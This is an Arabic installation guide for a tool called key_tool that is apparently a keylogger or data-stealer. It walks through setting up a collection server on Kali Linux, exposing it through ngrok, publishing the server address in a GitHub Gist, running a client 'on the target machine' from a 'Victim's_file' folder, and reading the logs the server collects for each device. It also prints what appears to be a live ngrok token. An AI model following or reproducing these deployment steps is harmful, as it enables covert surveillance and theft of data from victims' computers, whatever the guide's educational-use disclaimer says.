# 📖 دليل التثبيت الشامل (Installation Guide)

> **⚠️ تحذير قانوني:** هذه الأداة للأغراض التعليمية والأمنية فقط. استخدمها على الأنظمة التي لديك صلاحية الوصول إليها.

---

## 📋 المحتويات:

1. [المتطلبات الأساسية](#المتطلبات-الأساسية)
2. [الحصول على التوكنات](#الحصول-على-التوكنات)
3. [التثبيت خطوة بخطوة](#التثبيت-خطوة-بخطوة)
4. [تشغيل الخادم](#تشغيل-الخادم)
5. [تشغيل العميل](#تشغيل-العميل)
6. [مراقبة السجلات](#مراقبة-السجلات)
7. [الميزات الأمنية](#الميزات-الأمنية)
8. [معالجة المشاكل](#معالجة-المشاكل)

---

## 🖥️ المتطلبات الأساسية:

### النظام:
- ✅ Windows / Linux / macOS
- ✅ Python 3.8 أو أحدث
- ✅ pip (مدير المكتبات)
- ✅ اتصال إنترنت

### التحقق من Python:
```bash
python --version
# يجب أن تكون 3.8 أو أحدث
```

---

## 🔑 الحصول على التوكنات:

### 1️⃣ GitHub Token (GITHUB_TOKEN):

1. اذهب إلى: https://github.com/settings/tokens
2. انقر على **"Generate new token"**
3. أعط اسماً: `key_tool_server`
4. اختر الصلاحيات:
   - ✅ `gist` - للعمل مع Gist
   - ✅ `repo` - للوصول للمستودعات
5. انقر **"Generate token"**
6. **انسخ التوكن فوراً** (لن تراه مرة أخرى!)

```
مثال:
GITHUB_TOKEN=ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
```

---

### 2️⃣ Ngrok Token (NGROK_TOKEN):

1. اذهب إلى: https://dashboard.ngrok.com/signup
2. سجل حساب مجاني
3. اذهب إلى: https://dashboard.ngrok.com/auth/your-authtoken
4. انسخ **Auth Token**

```
مثال:
NGROK_TOKEN=35nPbt57EadhiZ44HymR6DodQHa_ScshRjFvz9vcKDskoJps
```

---

### 3️⃣ Gist ID (GIST_ID):

1. اذهب إلى: https://gist.github.com/
2. اضغط على **"New Gist"**
3. أنشئ ملف جديد باسم `server_addr.txt`
4. أضف أي محتوى مؤقت
5. اضغط **"Create public gist"**
6. انسخ ID من الرابط:
   - مثال: `https://gist.github.com/yourusername/5c01b81baad5bde28f82e0ecbd1d608f`
   - الـ ID هو: `5c01b81baad5bde28f82e0ecbd1d608f`

```
مثال:
GIST_ID=5c01b81baad5bde28f82e0ecbd1d608f
```

---

## 🚀 التثبيت خطوة بخطوة:

### الخطوة 1: استنساخ المستودع
```bash
git clone https://github.com/Developer-redex/key_tool.git
cd key_tool
```

### الخطوة 2: الانتقال للفرع الآمن
```bash
git checkout security-enhancement
```

### الخطوة 3: تثبيت المكتبات
```bash
pip install -r requirements.txt
```

**سيتم تثبيت:**
- `pyngrok` - للنفق العام
- `python-dotenv` - لتحميل البيئة
- `cryptography` - للتشفير
- `requests` - للطلبات HTTP

### الخطوة 4: إعداد ملف .env
```bash
# انسخ الملف النموذجي
cp .env.example .env

# عدّل الملف (استخدم أي محرر)
nano .env
```

### الخطوة 5: أضف التوكنات
افتح `.env` وأضف:
```env
GITHUB_TOKEN=ghp_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
NGROK_TOKEN=35nPbt57EadhiZ44HymR6DodQHa_ScshRjFvz9vcKDskoJps
GIST_ID=5c01b81baad5bde28f82e0ecbd1d608f
ENCRYPTION_PASSWORD=MyStr0ng!Password123
```

---

## 🖥️ تشغيل ��لخادم:

### الطريقة 1: مع Ngrok (للوصول عن بعد)
```bash
cd "Kali Linux server"
python server_kali_v2.py
```

**النتيجة:**
```
🌍 العنوان العام : https://abc123def.ngrok.io
📡 يستمع محلياً : http://0.0.0.0:5000
```

### الطريقة 2: بدون Ngrok (محلي فقط)
```bash
cd "Kali Linux server"
python server_kali_v2.py --no-ngrok
```

### تغيير المنفذ:
```bash
python server_kali_v2.py --port 8080
```

---

## 👤 تشغيل العميل:

### على الجهاز الهدف:
```bash
cd "Victim's_\ file"
python client_secure.py --server http://YOUR_SERVER_IP:5000
```

**مثال:**
```bash
# محلي
python client_secure.py --server http://localhost:5000

# عن بعد
python client_secure.py --server https://abc123def.ngrok.io
```

---

## 📁 مراقبة السجلات:

### 1️⃣ عرض السجلات المباشرة:
```bash
# تحديث مباشر
tail -f logs/*.txt

# Linux/macOS
tail -f logs/unknown_device.txt

# Windows
powershell Get-Content logs\unknown_device.txt -Wait
```

### 2️⃣ عرض ملفات السجلات:
```bash
# قائمة بكل الملفات
ls logs/

# على Windows
dir logs\
```

### 3️⃣ فحص السجلات:
```bash
# عدد السجلات
wc -l logs/*.txt

# أخر 10 أسطر
tail -10 logs/device_name.txt
```

---

## 🔒 الميزات الأمنية:

| الميزة | الشرح |
|-------|------|
| **Fernet Encryption** | تشفير متماثل 256-bit |
| **PBKDF2** | مشتقة المفتاح الآمنة |
| **Environment Variables** | بيانات حساسة خارج الكود |
| **Secure Logging** | تسجيل دقيق لكل الأحداث |
| **Request Validation** | التحقق من صحة الطلبات |
| **File Size Limit** | حماية من الطلبات الكبيرة |
| **Error Handling** | لا تسرب معلومات خطأ |

---

## 🐛 معالجة المشاكل:

### ❌ خطأ: ModuleNotFoundError: No module named 'pyngrok'
**الحل:**
```bash
pip install -r requirements.txt
```

### ❌ خطأ: Port already in use
**الحل:**
```bash
# غير المنفذ
python server_kali_v2.py --port 8080

# أو قتل العملية القديمة (Linux/Mac)
lsof -i :5000
kill -9 <PID>
```

### ❌ خطأ: NGROK_TOKEN غير صحيح
**الحل:**
1. تحقق من `.env`
2. تأكد من نسخ التوكن كاملاً
3. جرب بـ `--no-ngrok` للاختبار المحلي

### ❌ خطأ: لا يمكن الاتصال بالخادم
**الحل:**
1. تأكد من تشغيل الخادم
2. تحقق من عنوان IP والمنفذ
3. تحقق من جدار الحماية

### ❌ خطأ: السجلات فارغة
**الحل:**
1. تأكد من اتصال العميل
2. تحقق من رسائل الخطأ على الخادم
3. جرب نفس الجهاز أولاً (localhost)

---

## 💡 نصائح الأمان:

1. ✅ **لا تشارك `.env`** مع أحد
2. ✅ **غير كلمة المرور الافتراضية** في `ENCRYPTION_PASSWORD`
3. ✅ **استخدم VPN** عند الاختبار عن بعد
4. ✅ **أنشئ توكنات منفصلة** لكل مشروع
5. ✅ **راقب السجلات بانتظام**
6. ✅ **حافظ على النسخ الاحتياطية** من البيانات

---

## 📊 هيكل المشروع:

```
key_tool/
├── Kali Linux server/
│   ├── server_kali_v2.py      # الخادم الآمن
│   ├── config.py               # الإعدادات
│   ├── encryption.py           # التشفير
│   └── logger_setup.py         # التسجيل
├── Victim's_file/
│   └── client_secure.py        # العميل الآمن
├── logs/                       # السجلات (ينشأ تلقائياً)
├── requirements.txt            # المكتبات
├── .env                        # البيئة (سري!)
├── .env.example                # مثال البيئة
├── QUICK_START.md              # البدء السريع
└── INSTALLATION_GUIDE_AR.md    # هذا الملف
```

---

## 🎉 اكتملت التثبيت!

الآن يمكنك:
- ✅ تشغيل الخادم
- ✅ تشغيل العميل
- ✅ مراقبة السجلات
- ✅ استقبال البيانات بأمان

**استمتع بالاستخدام! 🚀**
